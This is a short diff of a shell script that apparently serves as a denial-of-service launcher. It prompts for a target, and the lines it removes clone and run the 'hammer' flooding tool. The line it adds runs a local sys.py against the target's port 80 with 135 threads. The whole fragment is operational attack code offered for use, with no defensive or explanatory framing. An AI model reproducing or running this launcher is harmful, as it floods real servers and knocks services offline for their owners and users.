@@ -83,11 +83,5 @@ sleep 0.1
 read -p "TARGET:~# " pukqimaq
 sleep 1
 clear
-git clone https://github.com/cyweb/hammer
-sleep 0.1
-clear
-cd hammer
-sleep 0.1
-clear
-python hammer.py -s $pukqimaq -p 80 -t 135
+python sys.py -s $pukqimaq -p 80 -t 135
 fi
